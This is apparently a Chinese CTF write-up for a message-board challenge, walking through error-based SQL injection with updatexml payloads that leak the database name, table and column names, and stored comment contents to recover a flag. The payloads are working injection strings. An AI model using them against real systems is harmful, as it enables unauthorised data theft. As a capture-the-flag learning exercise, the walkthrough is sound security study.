# Week2 Word-For-You(2 Gen) 200



#### 0、知识点与工具

>   sql 注入

>   sql报错注入

>   工具：burpsuite

#### 1、页面

>   有两个页面，一个页面用于留言，也就是写入sql‌
>   ‌另一个页面用于查询留言，也就是触发注入的sql

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185718.png) ![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185757.png)





>   然后发现留言板查询页面无法看到留言的内容，只能看到查询是否成功

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117190746.png)







‌



#### 2、分析一下

>   首先根据这俩个页面的输入框，可以猜测后台的sql代码应该为：

‌

```
// 留言板
insert into 表名(你的名字，他的名字，内容) value();

// 查询留言
select * from 表名 where 名字 = '我们的传入的值';
```







‌

>   因为只显示是否查询成功，所以可以想到报错注入或者bool盲注‌
>   ‌由于bool盲注比较麻烦，所以首先尝试报错注入

‌

```
// 假如让ta的名字这一栏的值为：1'||updatexml(1,concat(0x7e,database()),1)#
// 留言内容随便，那么留言查询的sql就会变成
select * from 表名 where 名字 = '1'||updatexml(1,concat(0x7e,database()),1)#';
```







‌

>   显示的结果成功的爆出了数据库名称

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/675e2530aa6cac276a1e614794d411c.jpg)





‌

>   爆出了数据库那么接下来爆个表吧

‌

```
1'||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'wfy')),1)#
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/1686dad9f4a761d2089035dddf0db4b.jpg)







‌

>   然后爆个字段吧

‌

```
1'||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),1)#
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/2d4d96506fc2226df7c3ce6f3d36188.jpg)





‌

>   获取字段内容

‌

```
1'||updatexml(1,concat(0x7e,(select group_concat(text,user,name,display) from wfy_comments)),1)#
```





‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/840c1cd52f3a523a053d358250a989f.jpg)





‌

>   可以发现并没有显示flag，这是因为报错回显的内容最多为32个字符，超出部分就不会显示了，所以得加个substr字符串截取，或者写个脚本，‌
>   ‌substr函数不能加在group_concat()的前面，虽然会返回一个字符串但是放这里就有语法错误，但是在本地的测试到不会报错，奇奇怪怪

‌

```
1'||updatexml(1,substr(concat(0x7e,(select group_concat(text) from wfy_comments)),160,182),1)#'
```







‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/201792d828e3b0deb140931e30d4261.jpg) ![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f0ced2833c3e0c90c39652e3235f2dc.png)



‌

>   flag{Ju4t_m2ke_some_err0rs}







462 words